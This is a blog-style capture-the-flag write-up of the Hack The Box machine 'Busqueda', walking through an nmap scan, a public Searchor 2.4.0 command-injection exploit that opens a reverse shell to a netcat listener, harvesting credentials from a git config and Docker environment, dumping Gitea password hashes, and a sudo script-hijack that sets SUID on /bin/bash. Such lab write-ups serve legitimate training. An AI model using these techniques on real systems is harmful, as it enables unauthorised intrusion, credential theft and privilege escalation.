---
title: 'HTB Writeup - Busqueda'
date: 2025-05-13 17:00:00 +0000
categories: [HTB Easy Machines]
tags: [Easy, Linux, HTB, CVE-2023-43364, Gitea, Docker, Script Hijack]
---

Busqueda is an easy HTB machine where we abuse an exploit to get a foothold on the machine. From there we can run a python script as sudo that tells us that `gitea` is running, then looking inside a SQL database we get credentials to access `gitea`. From there we can read the `python` script and abuse how it works to get root.

<img src="../../assets/img/busqueda/image.png">

# Reconnaissance
```bash
[t3mpx@parrot]─[~/htb/easy/busqueda]
└──★$ nmap -np- -Pn -sVC --min-rate 5000 -oN nmap-scan.txt 10.10.11.208
Nmap scan report for 10.10.11.208
Host is up (0.053s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May 13 16:16:27 2025 -- 1 IP address (1 host up) scanned in 26.51 seconds
```
> SSH, HTTP

> Let’s add the domain to our /etc/hosts file: `echo -e '10.10.11.208\tsearcher.htb' | sudo tee -a /etc/hosts`

Let's take a look at [http://searcher.htb](http://searcher.htb):
<img src="../../assets/img/busqueda/image2.png">
> We got the version: `Searchor 2.4.0`

# Exploit
## CVE-2023-43364

A quick google [search](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection) reveals a RCE exploit:

```bash
[t3mpx@parrot]─[~/htb/easy/busqueda]
└──★$ ./exploit.sh searcher.htb 10.10.14.20 9001
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is searcher.htb
[*] Input attacker is 10.10.14.20:9001
[*] Run the Reverse Shell... Press Ctrl+C after successful connection
```

```bash
[t3mpx@parrot]─[~/htb/easy/busqueda]
└──★$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.11.208] 49994
bash: cannot set terminal process group (1646): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$
```

# Lateral Movement
## Shell as svc

Looking at the `config` file in the `/var/www/app/.git` folder gives us some credentials and tells us that `Gitea` is running:
```bash
bash-5.1$ cat config 
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```
> Remember to add `gitea.searcher.htb` to our `/etc/hosts` file

Let's SSH in to have a better shell:
```bash
[t3mpx@parrot]─[~/htb/easy/busqueda]
└──★$ sshpass -p 'jh1usoih2bkjaspwe92' ssh svc@searcher.htb -o StrictHostKeyChecking=No
svc@busqueda:~$
```

## Shell as root

After some enumeration we come across the following:
```bash
svc@busqueda:~$ sudo -l
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```
> Sadly we can't read what's inside the script, but we can run it as sudo

We can enumerate docker services with the script, coming across some credentials for `mysql`:
```bash
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
<SNIP>
"Env": [                                                                                                                                                
      "USER_UID=115",                                                         
      "USER_GID=121",                                                                                                                                       
      "GITEA__database__DB_TYPE=mysql",                                                                                                                     
      "GITEA__database__HOST=db:3306",                                                                                                                      
      "GITEA__database__NAME=gitea",                                                                                                                        
      "GITEA__database__USER=gitea",                                                                                                                        
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
<SNIP>
```
>gitea:yuiu1hoiu4i5ho1uh

After connecting to the database we find that there is a user called `administrator`:
```bash
svc@busqueda:~$ mysql -h 127.0.0.1 -u gitea -pyuiu1hoiu4i5ho1uh
mysql> use gitea;
Database changed
mysql> select name, passwd from user;
+---------------+------------------------------------------------------------------------------------------------------+
| name          | passwd                                                                                               |
+---------------+------------------------------------------------------------------------------------------------------+
| administrator | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
| cody          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
+---------------+------------------------------------------------------------------------------------------------------+
2 rows in set (0.00 sec)
```

We can log in to the `gitea` web using the `administrator` user and the same password from the mysql:
<img src="../../assets/img/busqueda/image3.png">

Inside [http://gitea.searcher.htb/administrator/scripts/src/branch/main/system-checkup.py](http://gitea.searcher.htb/administrator/scripts/src/branch/main/system-checkup.py) we can now read the python script:
<img src="../../assets/img/busqueda/image4.png">
> We're interested in the `./full-checkup.sh`

Since the option `full-checkup` is looking for a script called `full-checkup.sh` in the current folder, we can create our malicious `.sh` script to abuse this:
```bash
svc@busqueda:~$ cat full-checkup.sh 
#!/bin/bash
chmod +s /bin/bash
```
> Remember to give the script execute rights

We abuse the script using the following:
```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:~$ bash -p
bash-5.1#
```

### Root flag
```bash
bash-5.1# cat /root/root.txt
b5c0b5186722822a20618ecb54f25d29
```
